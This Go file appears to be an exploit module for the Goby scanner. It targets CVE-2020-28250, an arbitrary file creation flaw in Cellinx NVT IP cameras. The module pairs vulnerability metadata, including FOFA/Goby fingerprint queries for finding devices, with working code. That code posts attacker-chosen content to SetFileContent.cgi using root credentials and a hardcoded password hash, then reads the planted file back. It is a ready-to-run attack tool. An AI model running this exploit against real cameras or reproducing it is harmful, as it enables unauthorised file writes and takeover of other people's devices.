package exploits

import (
	"fmt"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"strings"
)

func init() {
	expJson := `{
    "Name": "Cellinx NVT camera SetFileContent.cgi file PATH parameter Arbitrary file creation vulnerability (CVE-2020-28250)",
    "Description": "<p>The Cellinx NVT IP PTZ is a camera device made by the South Korean company Cellinx.</p><p>Cellinx NVT 5.0.0.014 B.EST 2019-09-05 has a security vulnerability that allows an attacker to create and write arbitrary files through SetFileContent.cgi, such as overwriting /etc/passwd, to obtain server permissions.</p>",
    "Product": "Cellinx-NVT",
    "Homepage": "https://www.ispyconnect.com/camera/cellinx",
    "DisclosureDate": "2020-11-06",
    "PostTime": "2023-08-01",
    "Author": "h1ei1",
    "FofaQuery": "body=\"local/NVT-string.js\"",
    "GobyQuery": "body=\"local/NVT-string.js\"",
    "Level": "2",
    "Impact": "<p>Cellinx NVT 5.0.0.014 B.EST 2019-09-05 has a security vulnerability that allows an attacker to create and write arbitrary files through SetFileContent.cgi, such as overwriting /etc/passwd, to obtain server permissions.</p>",
    "Recommendation": "<p>1, the current manufacturer temporarily not repair measures to solve the security problem, it is recommended to use this software users pay close attention to manufacturer's home page or reference web site at any time to get a solution: <a href=\"https://www.ispyconnect.com/camera/cellinx.\">https://www.ispyconnect.com/camera/cellinx.</a></p><p>2. Set access policies and whitelist access through security devices such as firewalls.</p><p>3. Disable public network access to the system if necessary.</p>",
    "References": [
        "https://github.com/summtime/CVE/tree/master/CVE-2020-28250"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "filePath",
            "type": "input",
            "value": "testdsad11.txt",
            "show": ""
        },
        {
            "name": "fileContent",
            "type": "input",
            "value": "testcontent",
            "show": ""
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "File Creation"
    ],
    "VulType": [
        "File Creation"
    ],
    "CVEIDs": [
        "CVE-2020-28250"
    ],
    "CNNVD": [
        "CNNVD-202011-673"
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "9.0",
    "Translation": {
        "CN": {
            "Name": "Cellinx NVT 摄像机 SetFileContent.cgi 文件 PATH 参数任意文件创建漏洞（CVE-2020-28250）",
            "Product": "Cellinx-NVT",
            "Description": "<p>Cellinx NVT IP PTZ 是韩国 Cellinx 公司的一个摄像机设备。</p><p>Cellinx NVT 5.0.0.014b.test 2019-09-05版本存在安全漏洞，攻击者可通过 SetFileContent.cgi 创建和写入任意文件，如覆盖 /etc/passwd 等获取服务器权限。<br></p>",
            "Recommendation": "<p>1、目前厂商暂未发布修复措施解决此安全问题，建议使用此软件的用户随时关注厂商主页或参考网址以获取解决办法：<a href=\"https://www.ispyconnect.com/camera/cellinx\">https://www.ispyconnect.com/camera/cellinx</a>。</p><p>2、通过防火墙等安全设备设置访问策略，设置白名单访问。</p><p>3、如非必要，禁止公网访问该系统。</p>",
            "Impact": "<p>Cellinx NVT 5.0.0.014b.test 2019-09-05版本存在安全漏洞，攻击者可通过 SetFileContent.cgi 创建和写入任意文件，如覆盖 /etc/passwd 等获取服务器权限。<br></p>",
            "VulType": [
                "文件创建"
            ],
            "Tags": [
                "文件创建"
            ]
        },
        "EN": {
            "Name": "Cellinx NVT camera SetFileContent.cgi file PATH parameter Arbitrary file creation vulnerability (CVE-2020-28250)",
            "Product": "Cellinx-NVT",
            "Description": "<p>The Cellinx NVT IP PTZ is a camera device made by the South Korean company Cellinx.</p><p>Cellinx NVT 5.0.0.014 B.EST 2019-09-05 has a security vulnerability that allows an attacker to create and write arbitrary files through SetFileContent.cgi, such as overwriting /etc/passwd, to obtain server permissions.</p>",
            "Recommendation": "<p>1, the current manufacturer temporarily not repair measures to solve the security problem, it is recommended to use this software users pay close attention to manufacturer's home page or reference web site at any time to get a solution: <a href=\"https://www.ispyconnect.com/camera/cellinx.\">https://www.ispyconnect.com/camera/cellinx.</a></p><p>2. Set access policies and whitelist access through security devices such as firewalls.</p><p>3. Disable public network access to the system if necessary.</p>",
            "Impact": "<p>Cellinx NVT 5.0.0.014 B.EST 2019-09-05 has a security vulnerability that allows an attacker to create and write arbitrary files through SetFileContent.cgi, such as overwriting /etc/passwd, to obtain server permissions.<br></p>",
            "VulType": [
                "File Creation"
            ],
            "Tags": [
                "File Creation"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "10812"
}`

	defineCfg := func(hostInfo string, cfgData string) *httpclient.RequestConfig {
		cfg := httpclient.NewPostRequestConfig(hostInfo)
		cfg.VerifyTls = false
		cfg.FollowRedirect = false
		cfg.Header.Store("Content-Type", "application/x-www-form-urlencoded")
		cfg.Data = cfgData
		return cfg
	}

	httpRequest1080 := func(hostInfo *httpclient.FixUrl, cfg *httpclient.RequestConfig, uri2 string) (*httpclient.HttpResponse, bool) {
		respStatus := false
		resp, err := httpclient.DoHttpRequest(hostInfo, cfg)
		if err != nil || strings.Contains(resp.RawBody, "ERROR") {
			return nil, false
		}
		cfg2 := httpclient.NewGetRequestConfig(uri2)
		cfg2.VerifyTls = false
		cfg2.FollowRedirect = false
		resp2, err := httpclient.DoHttpRequest(hostInfo, cfg2)
		if err != nil {
			return nil, false
		}
		respStatus = true
		return resp2, respStatus
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			randFile := goutils.RandomHexString(6)
			uri := fmt.Sprintf("/cgi-bin/SetFileContent.cgi?USER=root&PWD=D1D1D1D1D1D1D1D1D1D1D1D1A2A2B0A1D1D1D1D1D1D1D1D1D1D1D1D1D1D1B8D1&PATH=/etc/html/%s.js", randFile)
			cfg := defineCfg(uri, randFile)
			uri2 := fmt.Sprintf("/local/%s.js", randFile)
			resp2, respStatus := httpRequest1080(u, cfg, uri2)
			if respStatus == true {
				return resp2.StatusCode == 200 && resp2.RawBody == randFile
			}
			return false
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			filePath := ss.Params["filePath"].(string)
			fileContent := ss.Params["fileContent"].(string)
			uri := fmt.Sprintf("/cgi-bin/SetFileContent.cgi?USER=root&PWD=D1D1D1D1D1D1D1D1D1D1D1D1A2A2B0A1D1D1D1D1D1D1D1D1D1D1D1D1D1D1B8D1&PATH=/etc/html/%s", filePath)
			cfg := defineCfg(uri, fileContent)
			resp2, respStatus := httpRequest1080(expResult.HostInfo, cfg, "/local/"+filePath)
			if respStatus == true {
				expResult.Output = resp2.RawBody + "\n URL: "+expResult.HostInfo.FixedHostInfo+ "/local/"+filePath
				expResult.Success = true
			}
			return expResult
		},
	))
}
